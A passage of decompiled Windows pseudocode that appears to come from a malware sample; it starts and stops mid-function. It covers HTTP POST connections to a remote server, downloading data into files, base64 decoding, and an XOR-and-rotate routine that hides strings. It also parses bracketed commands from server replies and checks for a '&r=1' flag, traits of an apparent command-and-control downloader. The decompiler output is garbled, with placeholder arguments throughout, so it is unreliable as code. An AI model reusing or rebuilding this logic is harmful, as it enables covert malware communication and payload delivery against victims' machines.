    int32_t * v17 = (int32_t *)(v11 - 32); // 0x409a7c
    *v17 = v14;
    _memcpy(&g14, &g14, (int32_t)&g14);
    int32_t v18 = v11 - 36; // 0x409a88
    int32_t * v19 = (int32_t *)v18; // 0x409a88
    *v19 = (int32_t)v1;
    int32_t * v20 = (int32_t *)(v11 - 40);
    *v20 = v9;
    int32_t * v21 = (int32_t *)(v11 - 44);
    *v21 = v14 + v10;
    _memcpy(&g14, &g14, (int32_t)&g14);
    *v13 = 0;
    *v15 = (int32_t)&v2;
    *v16 = (int32_t)v1;
    *v17 = v9;
    *v19 = 0;
    WriteFile(&g14, &g14, (int32_t)&g14, &g14, (struct _OVERLAPPED *)&g14);
    *v20 = v12;
    function_40cb7c();
    v10 += (int32_t)v1;
    while (v1 != NULL) {
        // 0x409a50
        v11 = v18;
        v12 = v14;
        *(int32_t *)(v11 - 4) = (int32_t)&v1;
        *(int32_t *)(v11 - 8) = 0x2710;
        *(int32_t *)(v11 - 12) = v9;
        *(int32_t *)(v11 - 16) = v7;
        InternetReadFile(&g14, &g14, (int32_t)&g14, &g14);
        v13 = (int32_t *)(v11 - 20);
        *v13 = v10 + (int32_t)v1;
        v14 = function_40bc21();
        v15 = (int32_t *)(v11 - 24);
        *v15 = v10;
        v16 = (int32_t *)(v11 - 28);
        *v16 = v12;
        v17 = (int32_t *)(v11 - 32);
        *v17 = v14;
        _memcpy(&g14, &g14, (int32_t)&g14);
        v18 = v11 - 36;
        v19 = (int32_t *)v18;
        *v19 = (int32_t)v1;
        v20 = (int32_t *)(v11 - 40);
        *v20 = v9;
        v21 = (int32_t *)(v11 - 44);
        *v21 = v14 + v10;
        _memcpy(&g14, &g14, (int32_t)&g14);
        *v13 = 0;
        *v15 = (int32_t)&v2;
        *v16 = (int32_t)v1;
        *v17 = v9;
        *v19 = 0;
        WriteFile(&g14, &g14, (int32_t)&g14, &g14, (struct _OVERLAPPED *)&g14);
        *v20 = v12;
        function_40cb7c();
        v10 += (int32_t)v1;
    }
    // 0x409adc
    *v20 = v7;
    InternetCloseHandle(&g14);
    *v21 = v4;
    InternetCloseHandle(&g14);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x409b10 - 0x409be5
int32_t function_409b10(int32_t a1) {
    int32_t v1 = a1; // 0x409b1c
    while (*(char *)v1 != 0) {
        // 0x409b20
        v1++;
    }
    int32_t v2 = v1 - a1; // 0x409b29
    int32_t v3 = (v2 - (v2 >> 31)) / 2; // 0x409b33
    int32_t * v4 = _malloc(v3); // 0x409b3d
    int32_t result = (int32_t)v4; // 0x409b3d
    _memset(v4, 0, v3);
    if (v2 < 1) {
        // 0x409bd2
        return result;
    }
    int32_t v5 = a1 + 1;
    int32_t v6 = 0; // 0x409b10
    int32_t v7 = 0; // 0x409bca
    while (true) {
        int32_t v8 = v7;
        int32_t v9 = v6;
        v6 = v9;
        int32_t v10 = v8; // 0x409b67
        if (*(char *)(v8 + a1) == 91) {
            // 0x409b69
            v6 = v9;
            v10 = v8;
            if (*(char *)(v8 + v5) == 91) {
                int32_t v11 = v8 + 2; // 0x409b70
                int32_t v12 = v9; // 0x409b77
                int32_t v13 = v11; // 0x409b77
                int32_t v14 = 0; // 0x409b77
                v6 = v9;
                v10 = v8;
                if (v11 < v2) {
                    int32_t v15; // 0x409b10
                    int32_t v16; // 0x409b10
                    while (true) {
                        int32_t v17 = v14;
                        v15 = v13;
                        v16 = v12;
                        char v18 = *(char *)(v15 + a1); // 0x409b83
                        if (v18 == 93) {
                            // 0x409b8b
                            if (*(char *)(v15 + v5) == v18) {
                                // break -> 0x409bc3
                                break;
                            }
                        }
                        int32_t v19 = v17 + 1; // 0x409b93
                        int32_t v20 = v16; // 0x409b96
                        if (v19 >= 1) {
                            uint64_t v21 = 0x55555556 * (int64_t)v19; // 0x409b9d
                            v20 = v16;
                            if (v19 == 3 * ((int32_t)(v21 / 0x8000000000000000) + (int32_t)(v21 / 0x100000000))) {
                                // 0x409baf
                                *(char *)(v16 + result) = v18;
                                v20 = v16 + 1;
                            }
                        }
                        int32_t v22 = v15 + 1; // 0x409bbc
                        v12 = v20;
                        v13 = v22;
                        v14 = v19;
                        v6 = v20;
                        v10 = v8;
                        if (v22 >= v2) {
                            goto lab_0x409bc7;
                        }
                    }
                    // 0x409bc3
                    v6 = v16;
                    v10 = v15 + 1;
                }
            }
        }
      lab_0x409bc7:
        // 0x409bc7
        v7 = v10 + 1;
        if (v7 >= v2) {
            // break -> 0x409bd2
            break;
        }
    }
    // 0x409bd2
    return result;
}

// Address range: 0x409bf0 - 0x409dfc
int32_t function_409bf0(int32_t a1) {
    // 0x409bf0
    int32_t v1; // 0x409bf0
    if (v1 == 0 || (char)v1 == 0) {
        // 0x409df5
        return 0;
    }
    char * lpString = (char *)v1; // 0x409c0f
    int32_t * memoryHandle = LocalAlloc(64, lstrlenA(lpString) + 1); // 0x409c1d
    int32_t v2 = (int32_t)memoryHandle; // 0x409c1d
    if ((char)v2 == 0) {
        // 0x409de2
        LocalFree(memoryHandle);
        return 0;
    }
    char v3 = *lpString; // 0x409c5c
    int32_t v4 = 0;
    int32_t v5; // 0x409bf0
    while (true) {
      lab_0x409c31:;
        int32_t v6 = v4;
        char v7 = v3; // 0x409c31
        if (v7 < 58 || (v7 & -33) < 91) {
            // 0x409c57
            *(char *)(v6 + v2) = v7;
            v5 = v6 + 1;
            goto lab_0x409c5b;
        } else {
            switch (v7) {
                case 43: {
                    // 0x409c57
                    *(char *)(v6 + v2) = v7;
                    v5 = v6 + 1;
                    goto lab_0x409c5b;
                }
                case 47: {
                    // 0x409c57
                    *(char *)(v6 + v2) = v7;
                    v5 = v6 + 1;
                    goto lab_0x409c5b;
                }
                default: {
                    // 0x409c53
                    v5 = v6;
                    if (v7 != 61) {
                        goto lab_0x409c5b;
                    } else {
                        // 0x409c57
                        *(char *)(v6 + v2) = v7;
                        v5 = v6 + 1;
                        goto lab_0x409c5b;
                    }
                }
            }
        }
    }
  lab_0x409c64:
    // 0x409c64
    if (v4 < 1) {
        // 0x409de2
        LocalFree(memoryHandle);
        return 0;
    }
    int32_t v8 = 0;
    char v9 = *(char *)(v8 + v2); // 0x409c7b
    int32_t v10 = v8 | 1; // 0x409c80
    char v11 = 65; // 0x409c8b
    if (v10 < v4) {
        // 0x409c8d
        v11 = *(char *)(v10 + v2);
    }
    char v12 = v11;
    int32_t v13 = 65; // 0x409c9c
    unsigned char v14 = 65; // 0x409c9c
    if (v10 + 1 < v4) {
        // 0x409c9e
        v14 = *(char *)((v8 | 2) + v2);
        v13 = v14;
    }
    int32_t v15 = v13; // 0x409d60
    int32_t v16 = v8 | 3; // 0x409cab
    char v17 = 65; // 0x409cb0
    if (v16 < v4) {
        // 0x409cb2
        v17 = *(char *)(v16 + v2);
    }
    char v18 = v17;
    char v19 = v9 - 65; // 0x409cbf
    char v20 = v19; // 0x409cc5
    if (v19 >= 26) {
        if (v9 < 123) {
            // 0x409cd6
            v20 = v9 - 71;
        } else {
            if (v9 < 58) {
                // 0x409ce5
                v20 = v9 + 4;
            } else {
                // 0x409cec
                v20 = v9 != 43 ? 63 : 62;
            }
        }
    }
    char v21 = v12 - 65; // 0x409cf8
    char v22 = v21; // 0x409cfb
    if (v21 >= 26) {
        if (v12 < 123) {
            // 0x409d0d
            v22 = v12 - 71;
        } else {
            if (v12 < 58) {
                // 0x409d1d
                v22 = v12 + 4;
            } else {
                // 0x409d25
                v22 = v12 != 43 ? 63 : 62;
            }
        }
    }
    unsigned char v23 = v22;
    char v24 = v15;
    int32_t v25; // 0x409bf0
    if (v24 < 91) {
        // 0x409d39
        v25 = v15 - 65;
    } else {
        if (v24 < 123) {
            // 0x409d46
            v25 = v15 - 71;
        } else {
            if (v24 < 58) {
                // 0x409d53
                v25 = v15 + 4;
            } else {
                // 0x409d58
                v25 = v24 != 43 ? 63 : 62;
            }
        }
    }
    uint32_t v26 = v25;
    unsigned char v27 = v18 - 65; // 0x409d63
    int32_t v28; // 0x409bf0
    if (v27 < 26) {
        // 0x409d6b
        v28 = v27;
    } else {
        if (v18 < 123) {
            // 0x409d77
            v28 = v18 - 71;
        } else {
            if (v18 < 58) {
                // 0x409d83
                v28 = v18 + 4;
            } else {
                // 0x409d87
                v28 = v18 != 43 ? 63 : 62;
            }
        }
    }
    int32_t v29 = v28;
    *(char *)a1 = v23 / 16 | 4 * v20;
    int32_t v30 = a1 + 1; // 0x409d9f
    int32_t v31 = v30; // 0x409da7
    if (v14 != 61) {
        // 0x409da9
        *(char *)v30 = (char)(v26 / 4) & 63 | 16 * v23;
        v31 = a1 + 2;
    }
    int32_t v32 = v31;
    int32_t v33 = v32; // 0x409dc0
    if (v18 != 61) {
        // 0x409dc2
        *(char *)v32 = (char)(v29 | 64 * v26);
        v33 = v32 + 1;
    }
    int32_t v34 = v8 + 4; // 0x409dd3
    int32_t v35 = v33; // 0x409ddc
    while (v34 < v4) {
        // 0x409c78
        v8 = v34;
        int32_t v36 = v33;
        v9 = *(char *)(v8 + v2);
        v10 = v8 | 1;
        v11 = 65;
        if (v10 < v4) {
            // 0x409c8d
            v11 = *(char *)(v10 + v2);
        }
        // 0x409c97
        v12 = v11;
        v13 = 65;
        v14 = 65;
        if (v10 + 1 < v4) {
            // 0x409c9e
            v14 = *(char *)((v8 | 2) + v2);
            v13 = v14;
        }
        // 0x409cab
        v15 = v13;
        v16 = v8 | 3;
        v17 = 65;
        if (v16 < v4) {
            // 0x409cb2
            v17 = *(char *)(v16 + v2);
        }
        // 0x409cbf
        v18 = v17;
        v19 = v9 - 65;
        v20 = v19;
        if (v19 >= 26) {
            if (v9 < 123) {
                // 0x409cd6
                v20 = v9 - 71;
            } else {
                if (v9 < 58) {
                    // 0x409ce5
                    v20 = v9 + 4;
                } else {
                    // 0x409cec
                    v20 = v9 != 43 ? 63 : 62;
                }
            }
        }
        // 0x409cf5
        v21 = v12 - 65;
        v22 = v21;
        if (v21 >= 26) {
            if (v12 < 123) {
                // 0x409d0d
                v22 = v12 - 71;
            } else {
                if (v12 < 58) {
                    // 0x409d1d
                    v22 = v12 + 4;
                } else {
                    // 0x409d25
                    v22 = v12 != 43 ? 63 : 62;
                }
            }
        }
        // 0x409d31
        v23 = v22;
        v24 = v15;
        if (v24 < 91) {
            // 0x409d39
            v25 = v15 - 65;
        } else {
            if (v24 < 123) {
                // 0x409d46
                v25 = v15 - 71;
            } else {
                if (v24 < 58) {
                    // 0x409d53
                    v25 = v15 + 4;
                } else {
                    // 0x409d58
                    v25 = v24 != 43 ? 63 : 62;
                }
            }
        }
        // 0x409d60
        v26 = v25;
        v27 = v18 - 65;
        if (v27 < 26) {
            // 0x409d6b
            v28 = v27;
        } else {
            if (v18 < 123) {
                // 0x409d77
                v28 = v18 - 71;
            } else {
                if (v18 < 58) {
                    // 0x409d83
                    v28 = v18 + 4;
                } else {
                    // 0x409d87
                    v28 = v18 != 43 ? 63 : 62;
                }
            }
        }
        // 0x409d8e
        v29 = v28;
        *(char *)v36 = v23 / 16 | 4 * v20;
        v30 = v36 + 1;
        v31 = v30;
        if (v14 != 61) {
            // 0x409da9
            *(char *)v30 = (char)(v26 / 4) & 63 | 16 * v23;
            v31 = v36 + 2;
        }
        // 0x409dbc
        v32 = v31;
        v33 = v32;
        if (v18 != 61) {
            // 0x409dc2
            *(char *)v32 = (char)(v29 | 64 * v26);
            v33 = v32 + 1;
        }
        // 0x409dcd
        v34 = v8 + 4;
        v35 = v33;
    }
    // 0x409de2
    LocalFree(memoryHandle);
    return v35 - a1;
  lab_0x409c5b:
    // 0x409c5b
    v4 = v5;
    int32_t v37; // 0x409bf0
    int32_t v38 = v37 + 1; // 0x409c5b
    v3 = *(char *)v38;
    v37 = v38;
    if (v3 == 0) {
        // break -> 0x409c64
        goto lab_0x409c64;
    }
    goto lab_0x409c31;
}

// Address range: 0x409e00 - 0x409eb4
int32_t function_409e00(void) {
    // 0x409e00
    int32_t lpString; // 0x409e00
    int32_t memoryHandle = (int32_t)LocalAlloc(64, lstrlenA((char *)lpString)); // 0x409e0e
    int32_t v1 = function_409bf0(memoryHandle); // 0x409e19
    int32_t v2 = v1 - (v1 >> 31); // 0x409e1f
    if (v2 < 2) {
        // 0x409eaf
        return memoryHandle;
    }
    int32_t v3 = 0; // 0x409e28
    int32_t v4 = 2 * v3 + memoryHandle;
    char v5 = *(char *)v4; // 0x409e30
    char v6 = v5 - 48; // 0x409e33
    char v7 = v6; // 0x409e39
    if (v6 >= 10) {
        if (v5 < 71) {
            // 0x409e4b
            v7 = v5 - 55;
        } else {
            // 0x409e53
            v7 = v5 < 103 ? v5 - 87 : 0;
        }
    }
    char v8 = *(char *)(v4 + 1); // 0x409e65
    char v9 = v8 - 48; // 0x409e69
    char v10 = v9; // 0x409e6f
    if (v9 >= 10) {
        if (v8 < 71) {
            // 0x409e81
            v10 = v8 - 55;
        } else {
            // 0x409e89
            v10 = v8 < 103 ? v8 - 87 : 0;
        }
    }
    unsigned char v11 = v10 + 16 * v7 ^ 35; // 0x409ea3
    *(char *)(v3 + memoryHandle) = v11 / 32 | 8 * v11;
    v3++;
    while (v3 != v2 / 2) {
        // 0x409e30
        v4 = 2 * v3 + memoryHandle;
        v5 = *(char *)v4;
        v6 = v5 - 48;
        v7 = v6;
        if (v6 >= 10) {
            if (v5 < 71) {
                // 0x409e4b
                v7 = v5 - 55;
            } else {
                // 0x409e53
                v7 = v5 < 103 ? v5 - 87 : 0;
            }
        }
        // 0x409e65
        v8 = *(char *)(v4 + 1);
        v9 = v8 - 48;
        v10 = v9;
        if (v9 >= 10) {
            if (v8 < 71) {
                // 0x409e81
                v10 = v8 - 55;
            } else {
                // 0x409e89
                v10 = v8 < 103 ? v8 - 87 : 0;
            }
        }
        // 0x409e9b
        v11 = v10 + 16 * v7 ^ 35;
        *(char *)(v3 + memoryHandle) = v11 / 32 | 8 * v11;
        v3++;
    }
    // 0x409eaf
    return memoryHandle;
}

// Address range: 0x409ec0 - 0x40a0c7
int32_t function_409ec0(int32_t a1) {
    // 0x409ec0
    __chkstk();
    _printf((char *)a1);
    int32_t v1; // 0x409ec0
    int32_t v2 = v1;
    v1 = v2 + 1;
    while (*(char *)v2 != 0) {
        // 0x409ef8
        v2 = v1;
        v1 = v2 + 1;
    }
    // 0x409eff
    int32_t v3; // bp-1200, 0x409ec0
    int16_t * v4 = (int16_t *)&v3; // bp-28, 0x409f0a
    int32_t v5; // 0x409ec0
    _mbstowcs((int16_t *)&v3, (char *)v5, 1 - v5 + v2);
    int32_t v6 = function_4099c0(&v3); // 0x409f17
    if (v6 == 0) {
        // 0x40a0b6
        return _40___security_check_cookie_40_4();
    }
    int32_t v7 = function_409b10(v6); // 0x409f28
    int32_t v8 = v7; // 0x409f32
    while (*(char *)v8 != 0) {
        // 0x409f35
        v8++;
    }
    int32_t v9 = v8 - v7; // 0x409f3c
    int32_t * v10 = _malloc(v9 + 1); // 0x409f44
    v4 = (int16_t *)v7;
    _strncpy((char *)v10, (char *)v7, v9);
    *(char *)(v9 + (int32_t)v10) = 0;
    int32_t memoryHandle = (int32_t)LocalAlloc(64, lstrlenA((char *)function_409e00())); // 0x409f6d
    function_409bf0(memoryHandle);
    v4 = (int16_t *)0x4b5a6978;
    int32_t * v11 = NULL; // bp-200, 0x409fbb
    _memset(NULL, (int32_t)&g14, (int32_t)&g14);
    int32_t v12; // bp-5368, 0x409ec0
    function_406890(&v12);
    int32_t v13 = memoryHandle; // 0x409fde
    while (*(char *)v13 != 0) {
        // 0x409fe0
        v13++;
    }
    int32_t v14 = v13 - memoryHandle; // 0x409fe7
    int32_t v15 = v14 & -0x7ffffff9; // 0x409feb
    int32_t v16; // 0x409ec0
    if (v15 >= 0) {
        // 0x409ff8
        v16 = v14;
        if (v15 == 0) {
            goto lab_0x40a00a;
        } else {
            // 0x409ffa
            v16 = v14 + 8 + (v14 >> 31 & 7) & -8;
            goto lab_0x40a00a;
        }
    } else {
        // 0x409ff3
        v16 = v14;
        if ((v14 + 7 & 7) == 7) {
            goto lab_0x40a00a;
        } else {
            // 0x409ffa
            v16 = v14 + 8 + (v14 >> 31 & 7) & -8;
            goto lab_0x40a00a;
        }
    }
  lab_0x40a00a:;
    int32_t v17 = (int32_t)&v4; // 0x409fd8
    int32_t * v18; // 0x409ec0
    if (v16 < 1) {
        // 0x40a00a
        v18 = (int32_t *)(v17 - 4);
    } else {
        int32_t * v19 = (int32_t *)(v17 - 4);
        int32_t v20 = (v16 - 1) / 8 + 1; // 0x40a023
        int32_t v21 = memoryHandle; // 0x40a023
        *v19 = v21;
        function_4063d0((int32_t)&g14);
        v20--;
        v21 += 8;
        v18 = v19;
        while (v20 != 0) {
            // 0x40a02b
            *v19 = v21;
            function_4063d0((int32_t)&g14);
            v20--;
            v21 += 8;
            v18 = v19;
        }
    }
    int32_t v22 = (int32_t)&v11; // 0x40a04f
    *v18 = (int32_t)"http://";
    *(int32_t *)(v17 - 8) = v22;
    char * v23 = StrStrIA((char *)&g14, (char *)&g14); // 0x40a05d
    int32_t v24; // bp-193, 0x409ec0
    int32_t v25 = v23 == NULL ? v22 : (int32_t)&v24;
    *(int32_t *)(v17 - 12) = (int32_t)"https://";
    *(int32_t *)(v17 - 16) = v25;
    int32_t v26 = StrStrIA((char *)&g14, (char *)&g14) == NULL ? v25 : v25 + 8;
    char v27 = *(char *)v26; // 0x40a078
    int32_t v28 = 0; // 0x40a07e
    if (v27 != 47) {
        char v29 = v27; // 0x40a08a
        int32_t v30 = v26; // 0x40a08a
        int32_t v31 = 0; // 0x40a08a
        v28 = v31;
        while (v29 != 0) {
            // 0x40a094
            *(char *)(a1 - v26 + v30) = v29;
            v30++;
            v29 = *(char *)v30;
            v31++;
            v28 = v31;
            if (v29 == 47) {
                // break -> 0x40a0a0
                break;
            }
            v28 = v31;
        }
    }
    // 0x40a0a0
    *(int32_t *)(v17 - 20) = memoryHandle;
    *(char *)(v28 + a1) = 0;
    LocalFree(&g14);
    // 0x40a0b6
    return _40___security_check_cookie_40_4();
}

// Address range: 0x40a0d0 - 0x40a372
int32_t function_40a0d0(int32_t * a1) {
    int32_t v1 = 0x54534f50; // bp-20, 0x40a0fb
    _memset(a1, 0, 0x222e0);
    int32_t v2; // bp-144, 0x40a0d0
    if (!InternetGetConnectedState(&v2, 0)) {
        // 0x40a35c
        return _40___security_check_cookie_40_4();
    }
    // 0x40a125
    int32_t v3; // 0x40a0d0
    int32_t * v4 = InternetConnectA((int32_t *)g8, (char *)v3, 80, NULL, NULL, 3, 0, 1); // 0x40a139
    if (v4 == NULL) {
        // 0x40a146
        return _40___security_check_cookie_40_4();
    }
    int32_t v5 = 0x746e6f43; // bp-120, 0x40a15d
    int32_t * memoryHandle = LocalAlloc(64, 50); // 0x40a1b3
    int32_t v6 = (int32_t)memoryHandle; // bp-128, 0x40a1b9
    *(char *)memoryHandle = 97;
    *(char *)(v6 + 1) = 112;
    *(char *)(v6 + 2) = 112;
    *(char *)(v6 + 3) = 108;
    *(char *)(v6 + 4) = 105;
    *(char *)(v6 + 5) = 99;
    *(char *)(v6 + 6) = 97;
    *(char *)(v6 + 7) = 116;
    *(char *)(v6 + 8) = 105;
    *(char *)(v6 + 9) = 111;
    *(char *)(v6 + 10) = 110;
    *(char *)(v6 + 11) = 47;
    *(char *)(v6 + 12) = 120;
    *(char *)(v6 + 13) = 45;
    *(char *)(v6 + 14) = 119;
    *(char *)(v6 + 15) = 119;
    *(char *)(v6 + 16) = 119;
    *(char *)(v6 + 17) = 45;
    *(char *)(v6 + 18) = 102;
    *(char *)(v6 + 19) = 111;
    *(char *)(v6 + 20) = 114;
    *(char *)(v6 + 21) = 109;
    *(char *)(v6 + 22) = 45;
    *(char *)(v6 + 23) = 117;
    *(char *)(v6 + 24) = 114;
    *(char *)(v6 + 25) = 108;
    *(char *)(v6 + 26) = 101;
    *(char *)(v6 + 27) = 110;
    *(char *)(v6 + 28) = 99;
    *(char *)(v6 + 29) = 111;
    *(char *)(v6 + 30) = 100;
    *(char *)(v6 + 31) = 101;
    *(char *)(v6 + 32) = 100;
    int32_t v7; // 0x40a0d0
    char * lpString = (char *)v7; // bp-208, 0x40a2a4
    int32_t v8 = (int32_t)&lpString; // 0x40a2a4
    *(char *)(v6 + 33) = 0;
    int32_t v9 = 0; // 0x40a2b3
    int32_t v10 = v8; // 0x40a2b3
    int32_t v11 = v8; // 0x40a2b3
    int32_t v12 = 0; // 0x40a2b3
    if (lstrlenA(lpString) >= 1) {
        int32_t v13 = 0;
        int32_t v14 = v9 + v7;
        int32_t v15 = v13; // 0x40a2b9
        if (*(char *)v14 == 46) {
            // 0x40a2bb
            v15 = v13;
            if (*(char *)(v14 + 1) == 112) {
                // 0x40a2c2
                v15 = v13;
                if (*(char *)(v14 + 2) == 104) {
                    // 0x40a2c9
                    v15 = v13;
                    if (*(char *)(v14 + 3) == 112) {
                        // 0x40a2d0
                        *(char *)(v14 + 4) = 0;
                        v15 = v14 + 5;
                    }
                }
            }
        }
        int32_t v16 = v15;
        v10 -= 4;
        v9++;
        uint32_t v17 = lstrlenA((char *)&g14); // 0x40a2db
        v11 = v10;
        v12 = v16;
        while (v9 < v17) {
            // 0x40a2b5
            v13 = v16;
            v14 = v9 + v7;
            v15 = v13;
            if (*(char *)v14 == 46) {
                // 0x40a2bb
                v15 = v13;
                if (*(char *)(v14 + 1) == 112) {
                    // 0x40a2c2
                    v15 = v13;
                    if (*(char *)(v14 + 2) == 104) {
                        // 0x40a2c9
                        v15 = v13;
                        if (*(char *)(v14 + 3) == 112) {
                            // 0x40a2d0
                            *(char *)(v14 + 4) = 0;
                            v15 = v14 + 5;
                        }
                    }
                }
            }
            // 0x40a2d9
            v16 = v15;
            v10 -= 4;
            v9++;
            v17 = lstrlenA((char *)&g14);
            v11 = v10;
            v12 = v16;
        }
    }
    int32_t v18 = (int32_t)v4; // 0x40a139
    *(int32_t *)(v11 - 4) = 0;
    *(int32_t *)(v11 - 8) = -0x7c000000;
    *(int32_t *)(v11 - 12) = (int32_t)&v6;
    *(int32_t *)(v11 - 16) = 0;
    *(int32_t *)(v11 - 20) = 0;
    *(int32_t *)(v11 - 28) = (int32_t)&v1;
    *(int32_t *)(v11 - 32) = v18;
    int32_t v19 = HttpOpenRequestA(); // 0x40a2fd
    if (v19 == 0) {
        // 0x40a146
        return _40___security_check_cookie_40_4();
    }
    int32_t v20 = &v5; // 0x40a30d
    int32_t v21 = v20; // 0x40a310
    while (*(char *)v21 != 0) {
        // 0x40a313
        v21++;
    }
    // 0x40a31a
    *(int32_t *)(v11 - 36) = v12;
    *(int32_t *)(v11 - 40) = lstrlenA((char *)&g14);
    *(int32_t *)(v11 - 44) = v12;
    int32_t v22; // bp-119, 0x40a0d0
    *(int32_t *)(v11 - 48) = v21 - (int32_t)&v22;
    *(int32_t *)(v11 - 52) = v20;
    *(int32_t *)(v11 - 56) = v19;
    HttpSendRequestA(&g14, (char *)&g14, (int32_t)&g14, &g14, (int32_t)&g14);
    int32_t v23; // bp-140, 0x40a0d0
    *(int32_t *)(v11 - 60) = (int32_t)&v23;
    *(int32_t *)(v11 - 64) = 0x222e0;
    *(int32_t *)(v11 - 68) = (int32_t)a1;
    *(int32_t *)(v11 - 72) = v19;
    InternetReadFile(&g14, &g14, (int32_t)&g14, &g14);
    *(int32_t *)(v11 - 76) = v19;
    InternetCloseHandle(&g14);
    *(int32_t *)(v11 - 80) = v18;
    InternetCloseHandle(&g14);
    // 0x40a35c
    return _40___security_check_cookie_40_4();
}

// Address range: 0x40a380 - 0x40a684
int32_t function_40a380(int32_t uFlags) {
    // 0x40a380
    __chkstk();
    int32_t * memoryHandle = LocalAlloc(uFlags, (int32_t)&g14); // 0x40a3ac
    int32_t v1; // 0x40a380
    int32_t v2 = StrStrIA((char *)memoryHandle, (char *)&g14) == NULL ? v1 : v1 + 7;
    int32_t v3 = StrStrIA((char *)v2, "https://") == NULL ? v2 : v2 + 8;
    unsigned char v4 = *(char *)v3; // 0x40a3de
    int32_t v5 = 0; // 0x40a3e4
    int32_t v6; // bp-88, 0x40a380
    if (v4 >= 1) {
        int32_t v7 = (int32_t)&v6 - v3; // 0x40a3eb
        char v8 = v4; // 0x40a3ed
        int32_t v9 = v3; // 0x40a3ed
        int32_t v10 = 0; // 0x40a3ed
        v5 = v10;
        while (v8 != 47) {
            // 0x40a3f4
            *(char *)(v7 + v9) = v8;
            v9++;
            v8 = *(char *)v9;
            v10++;
            v5 = v10;
            if (v10 >= (int32_t)v8) {
                // break -> 0x40a40f
                break;
            }
            v5 = v10;
        }
    }
    // 0x40a40f
    int32_t v11; // bp-4, 0x40a380
    *(char *)((int32_t)&v11 - 84 + v5) = 0;
    int32_t v12; // bp-140248, 0x40a380
    if (function_40a0d0(&v12) == 0) {
        // 0x40a42d
        LocalFree(memoryHandle);
        // 0x40a66b
        ReleaseMutex(&g14);
        return _40___security_check_cookie_40_4();
    }
    // 0x40a440
    char * v13; // bp-56, 0x40a380
    if (StrStrIA((char *)&v12, "&r=1") != NULL) {
        // 0x40a452
        LocalFree(memoryHandle);
        *(int32_t *)&v13 = (int32_t)g5;
        ReleaseMutex((int32_t *)g5);
        return _40___security_check_cookie_40_4();
    }
    int32_t v14 = (int32_t)memoryHandle; // 0x40a3ac
    v13 = (char *)&v12;
    char * v15 = StrStrIA((char *)&v12, "404 Not Found"); // 0x40a488
    char ** v16 = &v13; // 0x40a48c
    int32_t v17; // 0x40a380
    int32_t * v18; // bp-248, 0x40a380
    int32_t memoryHandle2; // 0x40a503
    if (v15 != NULL) {
        goto lab_0x40a65e;
    } else {
        char * v19 = (char *)&v12; // bp-64, 0x40a49d
        char * v20 = StrStrIA((char *)&v12, "[["); // 0x40a49e
        v16 = &v19;
        if (v20 == NULL) {
            goto lab_0x40a65e;
        } else {
            char * lpString = (char *)((int32_t)v20 + 2); // 0x40a4b2
            *StrStrIA(lpString, "]]") = 0;
            if (lstrlenA(lpString) == 0) {
                // 0x40a4c5
                LocalFree(memoryHandle);
                ReleaseMutex((int32_t *)g5);
                return _40___security_check_cookie_40_4();
            }
            int32_t uBytes = lstrlenA((char *)function_409e00()); // 0x40a4fe
            v6 = 64;
            memoryHandle2 = (int32_t)LocalAlloc(64, uBytes);
            function_409bf0(memoryHandle2);
            v18 = NULL;
            _memset(NULL, (int32_t)&g14, (int32_t)&g14);
            int32_t v21; // bp-144416, 0x40a380
            function_406890(&v21);
            int32_t v22 = memoryHandle2;
            int32_t v23 = v22 + 1; // 0x40a575
            while (*(char *)v22 != 0) {
                // 0x40a570
                v22 = v23;
                v23 = v22 + 1;
            }
            int32_t v24 = v22 - memoryHandle2; // 0x40a577
            int32_t v25 = v24 & -0x7ffffff9; // 0x40a57b
            if (v25 >= 0) {
                // 0x40a588
                v17 = v24;
                if (v25 == 0) {
                    goto lab_0x40a59a;
                } else {
                    // 0x40a58a
                    v17 = v24 + 8 + (v24 >> 31 & 7) & -8;
                    goto lab_0x40a59a;
                }
            } else {
                // 0x40a583
                v17 = v24;
                if ((v24 + 7 & 7) == 7) {
                    goto lab_0x40a59a;
                } else {
                    // 0x40a58a
                    v17 = v24 + 8 + (v24 >> 31 & 7) & -8;
                    goto lab_0x40a59a;
                }
            }
        }
    }
  lab_0x40a65e:;
    int32_t v26 = (int32_t)v16;
    *(int32_t *)(v26 - 4) = v14;
    LocalFree(&g14);
    *(int32_t *)(v26 - 8) = (int32_t)g5;
    // 0x40a66b
    ReleaseMutex(&g14);
    return _40___security_check_cookie_40_4();
  lab_0x40a59a:;
    int32_t v27 = &v6; // 0x40a568
    int32_t * v28; // 0x40a380
    if (v17 < 1) {
        // 0x40a59a
        v28 = (int32_t *)(v27 - 4);
    } else {
        int32_t * v29 = (int32_t *)(v27 - 4);
        int32_t v30 = (v17 - 1) / 8 + 1; // 0x40a5b3
        int32_t v31 = memoryHandle2; // 0x40a5b3
        *v29 = v31;
        function_4063d0((int32_t)&g14);
        v30--;
        v31 += 8;
        v28 = v29;
        while (v30 != 0) {
            // 0x40a5bb
            *v29 = v31;
            function_4063d0((int32_t)&g14);
            v30--;
            v31 += 8;
            v28 = v29;
        }
    }
    int32_t v32 = (int32_t)&v18; // 0x40a5d9
    *v28 = (int32_t)"http://";
    *(int32_t *)(v27 - 8) = v32;
    char * v33 = StrStrIA((char *)&g14, (char *)&g14); // 0x40a5e7
    int32_t v34; // bp-241, 0x40a380
    int32_t v35 = v33 == NULL ? v32 : (int32_t)&v34;
    *(int32_t *)(v27 - 12) = (int32_t)"https://";
    *(int32_t *)(v27 - 16) = v35;
    char * v36 = StrStrIA((char *)&g14, (char *)&g14); // 0x40a5f9
    int32_t v37 = v36 == NULL ? v35 : v35 + 8;
    char v38 = *(char *)v37; // 0x40a602
    int32_t v39 = 0; // 0x40a608
    if (v38 != 47) {
        char v40 = v38; // 0x40a612
        int32_t v41 = v37; // 0x40a612
        int32_t v42 = 0; // 0x40a612
        v39 = v42;
        while (v40 != 0) {
            // 0x40a618
            *(char *)(uFlags - v37 + v41) = v40;
            v41++;
            v40 = *(char *)v41;
            v42++;
            v39 = v42;
            if (v40 == 47) {
                // break -> 0x40a624
                break;
            }
            v39 = v42;
        }
    }
    // 0x40a624
    *(int32_t *)(v27 - 20) = v14;
    *(char *)(v39 + uFlags) = 0;
    LocalFree(&g14);
    *(int32_t *)(v27 - 24) = (int32_t)g5;
    ReleaseMutex(&g14);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x40a690 - 0x40a9ff
int32_t function_40a690(int32_t a1) {
    // 0x40a690
    int32_t v1; // bp-1192, 0x40a690
    _memset(&v1, 0, 960);
    int32_t lpString1; // bp-952, 0x40a690
